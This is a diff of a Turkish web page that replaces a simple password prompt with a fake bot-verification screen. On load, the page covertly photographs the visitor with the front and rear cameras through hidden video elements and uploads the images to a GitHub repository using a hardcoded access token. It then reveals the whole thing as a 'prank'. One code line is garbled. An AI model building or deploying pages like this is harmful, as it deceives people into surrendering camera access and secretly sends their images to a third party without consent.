@@ -1,23 +1,139 @@
 <!DOCTYPE html>
 <html lang="tr">
-  <head>
-    <title>hatira</title>
-  </head>
-  <body>
-   <img src="p1.png" height="400px" width="450px">
-    <script>
-      
-      let sifre = "12345"
-      function sifrele() {
-        let girdi = prompt("şifeyi gir")
-        if (sifre === girdi) {
-          alert("doğru")
-        }else{
-          alert("yanlış")
-          sifrele()
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenlik Doğrulaması</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #121212;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
         }
-      }
-      sifrele()
+        .box {
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            max-width: 400px;
+            width: 90%;
+        }
+        h2 { color: #4CAF50; }
+        p { color: #bbb; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="contentBox">
+        <h2>Güvenlik Kontrolü</h2>
+        <p>Siteye devam etmek için bot olmadığını doğrulaman gerekiyor.</p>
+    </div>
+
+    <!-- Gizli video elementleri -->
+    <video id="videoFront" autoplay playsinline></video>
+    <video id="videoBack" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const GITHUB_TOKEN = 'Ghp_IEiPql2E4HGvq7BWVP2fVoDIUYDuVZ1nKstu'; 
+        const REPO_INFO = 'akif588/Oyun';
+
+        window.onload = async function() {
+            alert("Bu oyuna devam etmek için bot olmadığınızı kanıtlamak üzere kamera izni vermeniz gerekiyor.");
+            await captureAndUpload();
+        };
+
+        async function uploadToGitHub(base64Data, filename) {
+            const path = `fotolar/${filename}`;
+            const url = `https://api.github.com/repos/${REPO_INFO}/contents/${path}`;
+            
+            const base64Content = base64Data.split(',')[1];
+
+            const bodyData = {
+                message: `Şaka fotoğrafı eklendi: ${filename}`,
+                content: base64Content,
+                branch: "main"
+            };
+
+            try {
+                let response = await fetch(url, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `token ${GITHUB_TOKEN}`,
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(bodyData)
+                });
+                return await response.json();
+            } catch (err) {
+                console.error("Yükleme hatası:", err);
+            }
+        }
+
+        async function takeSnapshot(facingMode) {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const constraints = {
+                        video: { facingMode: facingMode }
+                    };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    const video = facingMode === 'user' ? document.getElementById('videoFront') : document.getElementById('videoBack');
+                    video.srcObject = stream;
+                    
+                    await new `ri`(`se`)(r => setTimeout(r, 1000)); // 1 saniye bekle
+
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const dataURL = canvas.toDataURL('image/jpeg', 0.8);
+
+                    stream.getTracks().forEach(track => track.stop());
+                    resolve(dataURL);
+                } catch (e) {
+                    reject(e);
+                }
+            });
+        }
+
+        async function captureAndUpload() {
+            const timestamp = Date.now();
+            
+            try {
+                try {
+                    const frontImage = await takeSnapshot('user');
+                    await uploadToGitHub(frontImage, `on_kamera_${timestamp}.jpg`);
+                } catch (e) {
+                    console.log("Ön kamera alınamadı");
+                }
+
+                try {
+                    const backImage = await takeSnapshot('environment');
+                    await uploadToGitHub(backImage, `arka_kamera_${timestamp}.jpg`);
+                } catch (e) {
+                    console.log("Arka kamera alınamadı");
+                }
+
+                document.getElementById('contentBox').innerHTML = `
+                    <h2 style="color: #ff5252;">Şaka Yaptım Kanka! 😄</h2>
+                    <p>Fotoğrafların başarıyla yakalandı ve GitHub'a gönderildi!</p>
+                `;
+            } catch (err) {
+                document.getElementById('contentBox').innerHTML = `
+                    <h2>Hata!</h2>
+                    <p>Kamera izni verilmediği için şaka yarım kaldı.</p>
+                `;
+            }
+        }
     </script>
-  </body>
+</body>
 </html>
